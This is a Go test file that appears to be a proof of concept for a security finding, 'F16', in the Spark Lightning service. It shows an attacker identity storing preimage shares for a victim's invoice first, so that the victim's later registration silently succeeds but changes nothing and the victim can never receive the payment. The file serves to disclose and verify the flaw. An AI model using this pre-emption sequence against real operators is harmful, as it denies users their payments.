// Reproduces F16. Drop at spark/so/grpc_test/f16_preimage_share_preemption_test.go
// and run: go test -v ./so/grpc_test/ -run TestF16_
package grpctest

import (
	"crypto/rand"
	"math/big"
	"testing"

	"github.com/decred/dcrd/dcrec/secp256k1/v4"
	eciesgo "github.com/ecies/go/v2"
	secretsharing "github.com/lightsparkdev/spark/common/secret_sharing"
	pbmock "github.com/lightsparkdev/spark/proto/mock"
	"github.com/lightsparkdev/spark/proto/spark"
	"github.com/lightsparkdev/spark/testing/wallet"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"google.golang.org/protobuf/proto"
)

func TestF16_PreimageShareOwnerPreemption(t *testing.T) {
	victim := wallet.NewTestWalletConfig(t)
	attacker := wallet.NewTestWalletConfig(t)
	require.NotEqual(t,
		victim.IdentityPublicKey().Serialize(),
		attacker.IdentityPublicKey().Serialize())

	amountSats := uint64(100)
	victimPreimage, paymentHash := testPreimageHash(t, amountSats)
	invoice := testInvoice
	defer cleanUp(t, victim, paymentHash)

	victimShares, err := secretsharing.SplitSecretWithProofs(
		new(big.Int).SetBytes(victimPreimage[:]),
		secp256k1.S256().N, victim.Threshold, len(victim.SigningOperators))
	require.NoError(t, err)

	var attackerSeed [32]byte
	_, err = rand.Read(attackerSeed[:])
	require.NoError(t, err)
	attackerSecret := new(big.Int).SetBytes(attackerSeed[:])
	attackerSecret.Mod(attackerSecret, secp256k1.S256().N)
	attackerShares, err := secretsharing.SplitSecretWithProofs(
		attackerSecret,
		secp256k1.S256().N, attacker.Threshold, len(attacker.SigningOperators))
	require.NoError(t, err)

	encryptForOperators := func(srcShares []*secretsharing.VerifiableSecretShare) map[string][]byte {
		out := make(map[string][]byte, len(victim.SigningOperators))
		for ident, op := range victim.SigningOperators {
			require.Less(t, op.ID, uint64(len(srcShares)))
			share := srcShares[op.ID]
			shareBytes, err := proto.Marshal(share.MarshalProto())
			require.NoError(t, err)
			pubKey, err := eciesgo.NewPublicKeyFromBytes(op.IdentityPublicKey.Serialize())
			require.NoError(t, err)
			ct, err := eciesgo.Encrypt(pubKey, shareBytes)
			require.NoError(t, err)
			out[ident] = ct
		}
		return out
	}

	attackerEncrypted := encryptForOperators(attackerShares)
	victimEncrypted := encryptForOperators(victimShares)

	coordinator := victim.SigningOperators[victim.CoordinatorIdentifier]

	// Step 1: attacker pre-empts using the victim's invoice + attacker identity.
	{
		conn, err := coordinator.NewOperatorGRPCConnection()
		require.NoError(t, err)
		token, err := wallet.AuthenticateWithConnection(t.Context(), attacker, conn)
		require.NoError(t, err)
		ctx := wallet.ContextWithToken(t.Context(), token)
		_, err = spark.NewSparkServiceClient(conn).StorePreimageShareV2(ctx,
			&spark.StorePreimageShareV2Request{
				PaymentHash:             paymentHash[:],
				EncryptedPreimageShares: attackerEncrypted,
				Threshold:               uint32(attacker.Threshold),
				InvoiceString:           invoice,
				UserIdentityPublicKey:   attacker.IdentityPublicKey().Serialize(),
			})
		require.NoError(t, err, "attacker's pre-emption accepted (F4 + F16)")
		conn.Close()
	}

	postAttackerStored := make(map[string][]byte, len(victim.SigningOperators))
	for ident, op := range victim.SigningOperators {
		c, err := op.NewOperatorGRPCConnection()
		require.NoError(t, err)
		resp, err := pbmock.NewMockServiceClient(c).QueryPreimageShare(t.Context(),
			&pbmock.QueryPreimageShareRequest{PaymentHash: paymentHash[:]})
		require.NoError(t, err)
		require.Equal(t, attackerShares[op.ID].MarshalProto().SecretShare, resp.PreimageShare,
			"operator %s should hold attacker's share after step 1", ident)
		postAttackerStored[ident] = resp.PreimageShare
		c.Close()
	}

	// Step 2: victim attempts legitimate registration. Returns nil — silent shadow.
	{
		conn, err := coordinator.NewOperatorGRPCConnection()
		require.NoError(t, err)
		token, err := wallet.AuthenticateWithConnection(t.Context(), victim, conn)
		require.NoError(t, err)
		ctx := wallet.ContextWithToken(t.Context(), token)
		_, err = spark.NewSparkServiceClient(conn).StorePreimageShareV2(ctx,
			&spark.StorePreimageShareV2Request{
				PaymentHash:             paymentHash[:],
				EncryptedPreimageShares: victimEncrypted,
				Threshold:               uint32(victim.Threshold),
				InvoiceString:           invoice,
				UserIdentityPublicKey:   victim.IdentityPublicKey().Serialize(),
			})
		require.NoError(t, err,
			"F16: victim's call silently succeeded despite row being owned by attacker. "+
				"A correct implementation rejects with AlreadyExists / FailedPrecondition.")
		conn.Close()
	}

	// Step 3: confirm row was not overwritten.
	for ident, op := range victim.SigningOperators {
		c, err := op.NewOperatorGRPCConnection()
		require.NoError(t, err)
		resp, err := pbmock.NewMockServiceClient(c).QueryPreimageShare(t.Context(),
			&pbmock.QueryPreimageShareRequest{PaymentHash: paymentHash[:]})
		require.NoError(t, err)
		assert.Equal(t, postAttackerStored[ident], resp.PreimageShare,
			"operator %s: stored share changed unexpectedly after victim's call", ident)
		assert.Equal(t, attackerShares[op.ID].MarshalProto().SecretShare, resp.PreimageShare,
			"operator %s: row should still hold attacker's share", ident)
		assert.NotEqual(t, victimShares[op.ID].MarshalProto().SecretShare, resp.PreimageShare,
			"operator %s: row unexpectedly holds victim's share — F16 may be fixed", ident)
		c.Close()
	}

	t.Log("F16 verified: attacker pre-empted preimage share ownership on every SO. " +
		"InitiatePreimageSwap with receiver=victim now hits the owner-equality gate " +
		"at lightning_handler.go:1049 / :1538 and refuses the receive permanently.")
}
